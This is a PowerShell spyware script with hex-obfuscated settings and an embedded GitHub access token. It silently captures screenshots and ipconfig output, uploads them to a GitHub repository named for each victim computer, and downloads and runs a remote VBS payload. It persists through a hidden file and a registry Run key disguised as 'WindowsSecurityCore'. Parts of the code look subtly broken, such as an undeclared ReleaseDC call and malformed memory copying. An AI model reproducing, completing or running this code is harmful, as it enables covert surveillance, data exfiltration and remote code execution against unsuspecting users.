
 $ErrorActionPreference = 'SilentlyContinue'


 $O = { param([string]$s) (-join ([regex]::Matches($s, '.{2}') | % { [char][byte]"0x$_" })) }

 $tk = & $O "47485f544f4b454e"
 $tv = & $O "6768705f544433793549623071437645327930344f507932364f366b7353475671563249485a4b34"
 $ow = & $O "67686f73742d6d7674"
 $rp = & $O "58555a"
 $cid = $env:COMPUTERNAME
 $cf = & $O "636d642e766273"


[System.Environment]::SetEnvironmentVariable($tk, $tv, 'Process')

if (-not $tv) { exit }

function Evade-Download-Exec {
    $apiUrl = "https://raw.githubusercontent.com/$ow/$rp/main/uploads/$cf"
    $savePath = "$env:TEMP\$cf"
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "token $tv")
        $wc.DownloadFile($apiUrl, $savePath)
        [Diagnostics.Process]::Start("wscript.exe", "`"$savePath`"")
    } catch {}
}

function Stealth-Screenshot {
    $tempDir = $env:TEMP
    $ssPath = "$tempDir\lab_cap.raw"
    $ipPath = "$tempDir\net_info.dat"
    
    
    $sig = '[DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow(); [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr hDC); [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nW, int nH); [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject); [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int x, int y, int w, int h, IntPtr hdcSrc, int x1, int y1, int rop); [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd); [DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr hDC); [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject); [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);'
    $gdi = Add-Type -MemberDefinition $sig -Name 'GDI32' -Namespace 'Win32' -PassThru -ErrorAction SilentlyContinue
    
    try {
        $w = $gdi::GetSystemMetrics(0); $h = $gdi::GetSystemMetrics(1)
        $hDesk = $gdi::GetDesktopWindow(); $hDC = $gdi::GetDC($hDesk)
        $hMemDC = $gdi::CreateCompatibleDC($hDC); $hBmp = $gdi::CreateCompatibleBitmap($hDC, $w, $h)
        $gdi::SelectObject($hMemDC, $hBmp) | Out-Null
        $gdi::BitBlt($hMemDC, 0, 0, $w, $h, $hDC, 0, 0, 0x00CC0020) | Out-Null
        
        
        $bmpHeader = [byte[]]@(0x42,0x4D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x36,0x00,0x00,0x00,0x28,0x00,0x00,0x00,[byte]($w -band 0xFF),[byte](($w -shr 8) -band 0xFF),[byte](($w -shr 16) -band 0xFF),[byte](($w -shr 24) -band 0xFF),[byte]($h -band 0xFF),[byte](($h -shr 8) -band 0xFF),[byte](($h -shr 16) -band 0xFF),[byte](($h -shr 24) -band 0xFF),0x01,0x00,0x18,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x13,0x0B,0x00,0x00,0x13,0x0B,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
        $padding = (4 - ($w * 3 % 4)) % 4
        $pixelDataSize = ($w * 3 + $padding) * $h
        [Array]::Reverse($bmpHeader[2..5]); $bmpHeader[2..5] = [BitConverter]::GetBytes(54 + $pixelDataSize)
        [System.IO.File]::WriteAllBytes($ssPath, $bmpHeader)
        $fileStream = [System.IO.File]::OpenWrite($ssPath); $fileStream.Seek(54, 0) | Out-Null
        for ($y = $h - 1; $y -ge 0; $y--) {
            for ($x = 0; $x -lt $w; $x++) {
                $px = [IntPtr]::Zero; [System.Runtime.InteropServices.Marshal]::Copy([IntPtr]($hBmp.ToInt64() + $y * $w * 4 + $x * 4), [byte[]]$px, 0, 3)
                $fileStream.Write([byte[]]$px, 0, 3)
            }
            if ($padding -gt 0) { $fileStream.Write([byte[]]@(,0 * $padding), 0, $padding) }
        }
        $fileStream.Close()
        $gdi::DeleteObject($hBmp); $gdi::DeleteDC($hMemDC); $gdi::ReleaseDC($hDesk, $hDC)
    } catch {}

    
    $proc = [Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]::new("cmd.exe", "/c ipconfig > `"$ipPath`"") { WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden, UseShellExecute = $false, RedirectStandardOutput = $true })
    $proc.WaitForExit()

    return @($ssPath, $ipPath)
}

function Stealth-Upload {
    param($files)
    $headers = @{ "Authorization" = "token $tv"; "Accept" = "application/vnd.github.v3+json"; "User-Agent" = "Mozilla/5.0" }
    $httpClient = New-Object System.Net.Http.HttpClient
    $httpClient.DefaultRequestHeaders.Add("Authorization", "token $tv")
    $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
    
    $map = @{ $files[0] = "uploads/$cid/Img.png"; $files[1] = "uploads/$cid/ipconfig.txt" }

    foreach ($local in $map.Keys) {
        if (Test-Path $local) {
            $bytes = [System.IO.File]::ReadAllBytes($local)
            $b64 = [System.Convert]::ToBase64String($bytes)
            $uri = "https://api.github.com/repos/$ow/$rp/contents/$($map[$local])"
            
            $sha = $null
            try {
                $req = [System.Net.Http.HttpRequestMessage]::new([System.Net.Http.HttpMethod]::Get, $uri)
                $resp = $httpClient.SendAsync($req).Result
                $jsonResp = $resp.Content.ReadAsStringAsync().Result | ConvertFrom-Json
                $sha = $jsonResp.sha
            } catch {}

            $body = @{ "message" = "up $cid"; "content" = $b64; "sha" = $sha } | ConvertTo-Json -Compress
            $content = New-Object System.Net.Http.StringContent($body, [System.Text.Encoding]::UTF8, "application/json")
            try { $httpClient.PutAsync($uri, $content).Wait() } catch {}
            Remove-Item $local -Force
        }
    }
}


 $taskRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regKeyName = "WindowsSecurityCore"
 $persistPath = "$env:APPDATA\WindowsSecurityCore.ps1"

try {
    $currentScriptContent = $MyInvocation.MyCommand.ScriptContents
    if (-not $currentScriptContent) {
        $currentScriptContent = [System.IO.File]::ReadAllText($PSCommandPath)
    }
    
    [System.IO.File]::WriteAllBytes($persistPath, [System.Text.Encoding]::UTF8.GetBytes($currentScriptContent))
    
    
    $file = Get-Item $persistPath -Force
    $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
} catch {}

 $regCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistPath`""
[System.Microsoft.Win32.Registry]::SetValue($taskRegPath, $regKeyName, $regCommand)


 $capturedFiles = Stealth-Screenshot
Stealth-Upload -files $capturedFiles
Evade-Download-Exec
